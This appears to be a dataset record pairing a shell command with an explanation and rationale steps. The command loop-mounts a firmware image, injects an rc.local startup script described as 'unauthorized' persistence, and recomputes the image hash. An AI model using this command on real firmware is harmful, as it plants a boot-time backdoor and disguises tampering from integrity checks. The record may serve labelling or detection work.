command: LOOP=$(losetup -f --show /root/firmware_mod.img) && MNT=$(mktemp -d) && mount $LOOP $MNT && cp /root/rc.local $MNT/etc/rc.local && chmod +x $MNT/etc/rc.local && umount $MNT && losetup -d $LOOP && rmdir $MNT && sha256sum /root/firmware_mod.img
explanation: Mounts a firmware image, injects a startup script to ensure persistence, then recomputes the image hash to track the altered content.
rationale_steps: Loop-mount the firmware image to enable offline modification.
Insert unauthorized initialization logic for persistence at boot.
Recompute hash to record the modified image's integrity for later checks.
